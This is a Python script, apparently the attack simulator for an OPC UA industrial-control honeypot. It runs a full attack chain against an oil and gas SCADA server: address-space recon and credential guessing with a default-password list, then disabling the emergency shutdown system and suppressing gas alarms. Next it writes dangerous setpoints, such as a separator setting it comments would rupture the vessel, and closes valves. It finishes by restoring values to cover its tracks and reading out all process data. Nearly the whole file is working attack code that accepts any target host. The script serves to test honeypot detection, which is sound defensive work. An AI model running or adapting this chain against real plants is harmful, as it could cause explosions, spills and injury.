"""
OpcUaTrap Attack Simulation — Full ICS Attack Chain
Simulates a realistic attacker targeting an oil & gas OPC UA SCADA system.

Attack phases:
  1. RECON      — Browse address space, read site info, identify critical nodes
  2. CREDENTIAL — Try honeytoken credentials (operator/admin/engineer)
  3. SAFETY OFF — Disable ESD system, close shutdown valves
  4. MANIPULATE — Change separator setpoints, open pipeline valve, stop pump
  5. COVER      — Write normal values back to hide the attack
  6. EXFIL      — Read all process values (data theft)

Usage:
  py attack_simulation.py [--host HOST] [--port PORT] [--phase PHASE]

Examples:
  py attack_simulation.py                          # Run all phases
  py attack_simulation.py --phase recon            # Recon only
  py attack_simulation.py --phase safety           # Disable safety only
  py attack_simulation.py --host 192.168.1.50      # Target remote host
"""

import asyncio
import argparse
import sys
import time
from datetime import datetime

from asyncua import Client, ua


# === Configuration ===
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 4840
NS = 2  # Namespace index for honeypot nodes

# Per-profile credential lists (honeytokens + decoys + noise)
PROFILE_CREDENTIALS = {
    "oil-gas": [
        ("operator", "op3rator!"),
        ("admin", "admin123"),
        ("engineer", "Welcome1"),
        ("readonly", "readonly"),
        ("root", "root"),
        ("admin", "password"),
    ],
    "water-treatment": [
        ("operator", "op3rator!"),
        ("admin", "admin123"),
        ("engineer", "Welcome1"),
        ("readonly", "readonly"),
        ("root", "root"),
        ("admin", "password"),
    ],
    "power-grid": [
        ("operator",      "op3rator!"),   # honeytoken — HIGH alert
        ("admin",         "admin123"),    # honeytoken — CRITICAL alert
        ("engineer",      "Welcome1"),    # honeytoken — CRITICAL alert
        ("svc_historian", "h1st0rian"),   # honeytoken — HIGH alert
        ("dispatcher",    "Disp@tch1"),   # decoy — silent accept
        ("relay_eng",     "R3lay#2024"),  # decoy — silent accept
        ("scada_svc",     "Sc4da$vc!"),   # decoy — silent accept
        ("admin",         "password"),    # noise — triggers lockout counter
    ],
}

# Default credentials (used when profile not specified)
CREDENTIALS = PROFILE_CREDENTIALS["oil-gas"]

# Critical nodes an attacker would target
CRITICAL_TARGETS = {
    "ESD_STATUS":           ("ESD Status", "int", 0),
    "ESD_LEVEL":            ("ESD Level", "int", 0),
    "SDV_701_POS":          ("Shutdown Valve 701", "bool", True),
    "SDV_702_POS":          ("Shutdown Valve 702", "bool", True),
    "SEP_HP_201_PSP_2001":  ("HP Separator Pressure Setpoint", "double", 1050.0),
    "SEP_LP_202_PSP_2001":  ("LP Separator Pressure Setpoint", "double", 150.0),
    "PMP_XFER_401_CMD_START": ("Pump Start Command", "bool", False),
    "PMP_XFER_401_CMD_STOP":  ("Pump Stop Command", "bool", False),
    "PL_EXPORT_601_XV":     ("Pipeline Block Valve", "bool", True),
    "TK_OIL_301_LAHH":     ("Tank 301 High-High Alarm", "double", 92.0),
    "TK_OIL_301_XV_IN":    ("Tank 301 Inlet Valve", "bool", True),
}

DANGEROUS_WRITES = {
    "SEP_HP_201_PSP_2001":  9999.0,   # Overpressure — would rupture vessel
    "SEP_LP_202_PSP_2001":  5.0,      # Underpressure — process upset
    "PMP_XFER_401_CMD_STOP": True,    # Stop transfer pump — tank overflow
    "PL_EXPORT_601_XV":     False,     # Close pipeline valve — overpressure upstream
    "SDV_701_POS":          False,     # Close shutdown valve — isolate wellhead
    "SDV_702_POS":          False,     # Close shutdown valve
    "TK_OIL_301_LAHH":     99.9,      # Raise alarm threshold — disable high-level protection
    "TK_OIL_301_XV_IN":    False,     # Close tank inlet — divert flow
}


def banner():
    print()
    print("  ============================================")
    print("    OPC UA ICS Attack Simulation v1.0")
    print("    FOR HONEYPOT TESTING ONLY")
    print("  ============================================")
    print()


def log(phase, msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    symbols = {"INFO": "[-]", "OK": "[+]", "WARN": "[!]", "FAIL": "[x]", "DATA": "[>]"}
    sym = symbols.get(level, "[-]")
    print(f"  {ts}  {sym} [{phase}] {msg}")


# ======================================================================
# Phase 1: RECON — Browse the address space
# ======================================================================
async def phase_recon(client):
    print("\n" + "=" * 60)
    print("  PHASE 1: RECONNAISSANCE")
    print("=" * 60)

    # Read server identity
    log("RECON", "Reading server identity...")
    server_node = client.get_node("i=2255")  # Server_ServerStatus_BuildInfo
    try:
        build_info = await server_node.read_value()
        log("RECON", f"BuildInfo: {build_info}", "DATA")
    except Exception:
        log("RECON", "Could not read BuildInfo, continuing...", "WARN")

    # Read site information
    log("RECON", "Reading site information...")
    site_nodes = {
        "SITE_NAME": "Site Name",
        "SITE_LOCATION": "Location",
        "SITE_OPERATOR": "Operator",
        "SITE_API": "API Number",
        "SITE_CAPACITY": "Design Capacity",
    }
    for node_id, label in site_nodes.items():
        try:
            node = client.get_node(f"ns={NS};s={node_id}")
            val = await node.read_value()
            log("RECON", f"{label}: {val}", "DATA")
        except Exception as e:
            log("RECON", f"Failed to read {label}: {e}", "FAIL")

    # Browse full address space tree
    log("RECON", "Browsing address space from Objects folder...")
    objects = client.get_node("i=85")
    all_nodes = await recursive_browse(client, objects, depth=0, max_depth=5)
    log("RECON", f"Discovered {len(all_nodes)} nodes in address space", "OK")

    # Build target table — name, current value, data type, writable flag
    log("RECON", "Profiling all variable nodes (value + access level)...")
    targets = []
    for node_id, name, node_class in all_nodes:
        if node_class != ua.NodeClass.Variable:
            continue
        try:
            n = client.get_node(node_id)
            val   = await n.read_value()
            dtype = type(val).__name__
            access = await n.read_attribute(ua.AttributeIds.UserAccessLevel)
            writable = bool(access.Value.Value and (access.Value.Value & 0x02))
            tag_id = node_id.Identifier if hasattr(node_id, "Identifier") else str(node_id)
            is_critical = str(tag_id) in CRITICAL_TARGETS
            targets.append((tag_id, name, val, dtype, writable, is_critical))
        except Exception:
            pass

    writable   = [t for t in targets if t[4]]
    critical   = [t for t in targets if t[5]]

    log("RECON", f"Total variable nodes : {len(targets)}", "OK")
    log("RECON", f"Writable nodes       : {len(writable)}", "OK")
    log("RECON", f"Critical targets     : {len(critical)}", "WARN")

    # Print critical targets table
    if critical:
        print()
        print("  +---------------------------------------------------------------------+")
        print("  |                     CRITICAL TARGET LIST                            |")
        print("  +--------------------------------+--------------+----------+-----------+")
        print("  | Display Name                   | Current Val  | Type     | Node ID   |")
        print("  +--------------------------------+--------------+----------+-----------+")
        for tag_id, name, val, dtype, writable, _ in critical:
            w_flag = "RW" if writable else "RO"
            print(f"  | {name:<30} | {str(val):<12} | {dtype:<8} | {str(tag_id):<9} | {w_flag}")
        print("  +---------------------------------------------------------------------+")
        print()

    return all_nodes


async def recursive_browse(client, node, depth=0, max_depth=5):
    results = []
    if depth > max_depth:
        return results
    try:
        children = await node.get_children()
        for child in children:
            try:
                name = await child.read_display_name()
                node_class = await child.read_node_class()
                results.append((child.nodeid, name.Text, node_class))
                if depth < 3:
                    indent = "  " * (depth + 1)
                    nc_str = "Folder" if node_class == ua.NodeClass.Object else \
                             "Variable" if node_class == ua.NodeClass.Variable else \
                             "Method" if node_class == ua.NodeClass.Method else str(node_class)
                    log("RECON", f"{indent}{name.Text} [{nc_str}]")
                results.extend(await recursive_browse(client, child, depth + 1, max_depth))
            except Exception:
                pass
    except Exception:
        pass
    return results


# ======================================================================
# Phase 2: CREDENTIAL TESTING — Try honeytoken credentials
# ======================================================================
async def phase_credentials(host, port):
    print("\n" + "=" * 60)
    print("  PHASE 2: CREDENTIAL TESTING")
    print("=" * 60)

    for username, password in CREDENTIALS:
        try:
            url = f"opc.tcp://{host}:{port}"
            c = Client(url)
            c.set_user(username)
            c.set_password(password)
            await c.connect()
            # Try to read a value to confirm access
            node = c.get_node(f"ns={NS};s=SITE_NAME")
            val = await node.read_value()
            log("CRED", f"{username}:{password} -> ACCESS GRANTED (read={val})", "OK")
            await c.disconnect()
        except Exception as e:
            log("CRED", f"{username}:{password} -> {e}", "FAIL")
        await asyncio.sleep(0.5)  # Realistic delay between attempts


# ======================================================================
# Phase 3: DISABLE SAFETY — Turn off ESD, close shutdown valves
# ======================================================================
async def phase_disable_safety(client):
    print("\n" + "=" * 60)
    print("  PHASE 3: DISABLE SAFETY SYSTEMS")
    print("=" * 60)

    # Read current safety status
    log("SAFETY", "Reading current safety system status...")
    safety_nodes = ["ESD_STATUS", "ESD_LEVEL", "SDV_701_POS", "SDV_702_POS",
                    "GD_801_ALM", "GD_802_ALM", "FD_811_ALM"]
    for nid in safety_nodes:
        try:
            node = client.get_node(f"ns={NS};s={nid}")
            val = await node.read_value()
            log("SAFETY", f"  {nid} = {val}", "DATA")
        except Exception as e:
            log("SAFETY", f"  {nid}: read failed ({e})", "FAIL")

    # Try to call ESD_CMD_TRIGGER method (the real prize)
    log("SAFETY", "Attempting to call ESD_CMD_TRIGGER method...", "WARN")
    try:
        parent = client.get_node(f"ns={NS};s=ESD")
        method = client.get_node(f"ns={NS};s=ESD_CMD_TRIGGER")
        result = await parent.call_method(method)
        log("SAFETY", f"ESD_CMD_TRIGGER returned: {result}", "OK")
    except Exception as e:
        log("SAFETY", f"ESD_CMD_TRIGGER call failed: {e}", "FAIL")

    # Write to ESD status to force it into a "disabled" state
    log("SAFETY", "Writing ESD_STATUS = 1 (force unhealthy)...", "WARN")
    await safe_write(client, "ESD_STATUS", 1, ua.VariantType.Int32)

    log("SAFETY", "Writing ESD_LEVEL = 3 (highest severity)...", "WARN")
    await safe_write(client, "ESD_LEVEL", 3, ua.VariantType.Int32)

    # Close shutdown valves (isolate safety systems)
    log("SAFETY", "Closing shutdown valve SDV_701...", "WARN")
    await safe_write(client, "SDV_701_POS", False, ua.VariantType.Boolean)

    log("SAFETY", "Closing shutdown valve SDV_702...", "WARN")
    await safe_write(client, "SDV_702_POS", False, ua.VariantType.Boolean)

    # Suppress fire & gas alarms
    log("SAFETY", "Suppressing gas detector alarms...", "WARN")
    await safe_write(client, "GD_801_ALM", False, ua.VariantType.Boolean)
    await safe_write(client, "GD_802_ALM", False, ua.VariantType.Boolean)

    log("SAFETY", "Safety systems disabled. Proceeding to process manipulation.", "OK")


# ======================================================================
# Phase 4: MANIPULATE PROCESS — Change setpoints, open/close valves
# ======================================================================
async def phase_manipulate(client):
    print("\n" + "=" * 60)
    print("  PHASE 4: PROCESS MANIPULATION")
    print("=" * 60)

    # Read current values first (attacker needs to know what to restore later)
    log("MANIP", "Reading current process values (pre-attack snapshot)...")
    original_values = {}
    for nid, (label, dtype, _) in CRITICAL_TARGETS.items():
        try:
            node = client.get_node(f"ns={NS};s={nid}")
            val = await node.read_value()
            original_values[nid] = val
            log("MANIP", f"  {nid} = {val} ({label})", "DATA")
        except Exception as e:
            log("MANIP", f"  {nid}: read failed ({e})", "FAIL")

    # === Attack 1: Separator overpressure ===
    log("MANIP", "ATTACK: Setting HP separator setpoint to 9999 PSI (vessel max = 1250)...", "WARN")
    await safe_write(client, "SEP_HP_201_PSP_2001", 9999.0, ua.VariantType.Double)
    await asyncio.sleep(1)

    log("MANIP", "ATTACK: Setting LP separator setpoint to 5 PSI (too low — process upset)...", "WARN")
    await safe_write(client, "SEP_LP_202_PSP_2001", 5.0, ua.VariantType.Double)
    await asyncio.sleep(1)

    # === Attack 2: Stop transfer pump ===
    log("MANIP", "ATTACK: Sending STOP command to transfer pump PMP_XFER_401...", "WARN")
    await safe_write(client, "PMP_XFER_401_CMD_STOP", True, ua.VariantType.Boolean)
    await asyncio.sleep(1)

    # === Attack 3: Close pipeline block valve ===
    log("MANIP", "ATTACK: Closing pipeline block valve PL_EXPORT_601_XV...", "WARN")
    await safe_write(client, "PL_EXPORT_601_XV", False, ua.VariantType.Boolean)
    await asyncio.sleep(1)

    # === Attack 4: Raise tank alarm thresholds (disable overflow protection) ===
    log("MANIP", "ATTACK: Raising tank high-high alarm to 99.9% (effectively disabling it)...", "WARN")
    await safe_write(client, "TK_OIL_301_LAHH", 99.9, ua.VariantType.Double)
    await asyncio.sleep(1)

    # === Attack 5: Close tank inlet valve ===
    log("MANIP", "ATTACK: Closing tank 301 inlet valve...", "WARN")
    await safe_write(client, "TK_OIL_301_XV_IN", False, ua.VariantType.Boolean)

    # === Attack 6: Manipulate wellhead choke (wide open — uncontrolled flow) ===
    log("MANIP", "ATTACK: Opening wellhead WH_101 choke to 95% (maximum flow)...", "WARN")
    await safe_write(client, "WH_101_CV_1001", 95.0, ua.VariantType.Double)

    log("MANIP", "Process manipulation complete. All critical setpoints modified.", "OK")
    return original_values


# ======================================================================
# Phase 5: COVER TRACKS — Restore normal-looking values
# ======================================================================
async def phase_cover_tracks(client, original_values):
    print("\n" + "=" * 60)
    print("  PHASE 5: COVER TRACKS")
    print("=" * 60)

    log("COVER", "Waiting 10 seconds (letting damage accumulate)...")
    for i in range(10, 0, -1):
        print(f"\r    Countdown: {i}s  ", end="", flush=True)
        await asyncio.sleep(1)
    print()

    log("COVER", "Restoring original values to hide attack evidence...")
    type_map = {
        "double": ua.VariantType.Double,
        "bool": ua.VariantType.Boolean,
        "int": ua.VariantType.Int32,
    }
    for nid, (label, dtype, default_val) in CRITICAL_TARGETS.items():
        restore_val = original_values.get(nid, default_val)
        vtype = type_map.get(dtype, ua.VariantType.Double)
        log("COVER", f"  Restoring {nid} -> {restore_val}")
        await safe_write(client, nid, restore_val, vtype)
        await asyncio.sleep(0.3)

    log("COVER", "All values restored. Attack traces remain only in server logs.", "OK")


# ======================================================================
# Phase 6: EXFILTRATE — Read all process data
# ======================================================================
async def phase_exfiltrate(client, all_nodes):
    print("\n" + "=" * 60)
    print("  PHASE 6: DATA EXFILTRATION")
    print("=" * 60)

    log("EXFIL", "Reading all variable node values...")
    exfil_data = {}
    count = 0
    for node_id, name, node_class in all_nodes:
        if node_class == ua.NodeClass.Variable:
            try:
                node = client.get_node(node_id)
                val = await node.read_value()
                exfil_data[str(node_id)] = {"name": name, "value": str(val)}
                count += 1
                if count <= 20:  # Print first 20
                    log("EXFIL", f"  {name} = {val}", "DATA")
            except Exception:
                pass

    if count > 20:
        log("EXFIL", f"  ... and {count - 20} more values", "DATA")
    log("EXFIL", f"Exfiltrated {count} process values total", "OK")

    return exfil_data


# ======================================================================
# Helper: Safe write with error handling
# ======================================================================
async def safe_write(client, node_str_id, value, variant_type):
    try:
        node = client.get_node(f"ns={NS};s={node_str_id}")
        dv = ua.DataValue(ua.Variant(value, variant_type))
        await node.write_value(dv)
        log("WRITE", f"  {node_str_id} = {value} -> StatusCode.Good", "OK")
        return True
    except Exception as e:
        log("WRITE", f"  {node_str_id} = {value} -> FAILED: {e}", "FAIL")
        return False


# ======================================================================
# Main
# ======================================================================
async def run_attack(host, port, phase=None):
    banner()
    url = f"opc.tcp://{host}:{port}"
    log("MAIN", f"Target: {url}")
    log("MAIN", f"Time: {datetime.now().isoformat()}")

    # Try anonymous first, fall back to first honeytoken credential.
    # Real attackers probe anonymous access before trying credentials.
    client = Client(url, timeout=30)
    connected = False

    try:
        log("MAIN", "Attempting anonymous connection...")
        await client.connect()
        log("MAIN", "Connected anonymously", "OK")
        connected = True
    except Exception as e:
        log("MAIN", f"Anonymous rejected: {e}", "WARN")

    if not connected:
        # Try each honeytoken credential over unencrypted channel
        for username, password in CREDENTIALS:
            try:
                log("MAIN", f"Trying credential: {username} / {password}")
                client = Client(url, timeout=30)
                client.set_user(username)
                client.set_password(password)
                await client.connect()
                log("MAIN", f"Connected as {username}", "OK")
                connected = True
                break
            except Exception as e:
                log("MAIN", f"  {username}: {e}", "FAIL")

    if not connected:
        log("MAIN", "All connection attempts failed.", "FAIL")
        log("MAIN", "If targeting oil-gas or power-grid profiles, those require", "WARN")
        log("MAIN", "encrypted connections (Basic256Sha256). Use --profile water-treatment", "WARN")
        log("MAIN", "for unencrypted testing, or run against port 4841 with that profile.", "WARN")
        return

    try:
        all_nodes = []
        original_values = {}

        if phase is None or phase == "recon":
            all_nodes = await phase_recon(client)

        if phase is None or phase == "safety":
            await phase_disable_safety(client)

        if phase is None or phase == "manipulate":
            original_values = await phase_manipulate(client)

        if phase is None or phase == "cover":
            await phase_cover_tracks(client, original_values)

        if phase is None or phase == "exfil":
            if not all_nodes:
                objects = client.get_node("i=85")
                all_nodes = await recursive_browse(client, objects, depth=0, max_depth=5)
            await phase_exfiltrate(client, all_nodes)

        # Summary
        print("\n" + "=" * 60)
        print("  ATTACK SIMULATION COMPLETE")
        print("=" * 60)
        log("MAIN", "Check honeypot console and NDJSON logs for detection results.")
        log("MAIN", "Expected alerts: CRITICAL writes to ESD, separator, pipeline nodes.")

    except Exception as e:
        log("MAIN", f"Attack interrupted: {e}", "FAIL")
    finally:
        await client.disconnect()
        log("MAIN", "Disconnected from target.")


def main():
    parser = argparse.ArgumentParser(description="OpcUaTrap Attack Simulation")
    parser.add_argument("--host", default=TARGET_HOST, help="Target host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=TARGET_PORT, help="Target port (default: 4840)")
    parser.add_argument("--phase", choices=["recon", "safety", "manipulate", "cover", "exfil"],
                        default=None, help="Run a single phase (default: all)")
    args = parser.parse_args()

    asyncio.run(run_attack(args.host, args.port, args.phase))


if __name__ == "__main__":
    main()
